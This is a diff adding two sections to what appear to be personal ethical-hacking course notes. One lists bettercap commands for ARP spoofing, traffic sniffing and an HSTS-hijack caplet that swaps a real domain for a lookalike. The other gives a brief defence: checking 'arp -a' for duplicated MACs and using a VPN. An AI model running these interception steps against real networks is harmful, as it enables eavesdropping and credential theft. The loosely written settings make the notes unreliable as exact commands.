@@ -251,4 +251,40 @@ _____________________________________________
 
 --------------------------------------------------------------------
 
+75. Changing Caplets
+***
+
+1. $ bettercap -iface eth0
+2. $ net.probe on
+3. $ help arp.spoof
+4. set arp.spoof.fullduplex true
+5. set arp.spoof.internal true
+6. set arp.spoof.targets 10.0.2.0
+7. net.sniff on
+
+8. Now : $ nano hstshijack.cap
+   In this Tutor sets in the last :
+     set hstshijack.target - atilsamancioglu.com
+     set hstshijack.replacements - atilsamancioglu.corn
+   SAVE THE FILE
+
+9. BUT MOST OF THE TIMES WONT WORK WELL , YOU'LL BE ABLE TO KNOW HOW THINGS WORK
+
+--------------------------------------------------------------------
+
+76. How To Protect Yourself
+***
+
+1. If you think anything suspicious is going on, 
+2. GO to COmmand prompt
+
+3. arp -a
+   # IF YOU SEE ROUTER MAC WITH SOME OTHER IP, LIKE IF THEY HAVE THE SAME MAC ADDRESS
+   THEN YOU ARE UNDER ATTACK
+
+4. SO BETTER YOU CAN USE VPN IF YOU ARE USING PUBLIC NETWORK LIKE IN RESTAURENT OR HOTEL OR WHATEVER
+
+---------------------------------------------------------------------
+ 
+
 
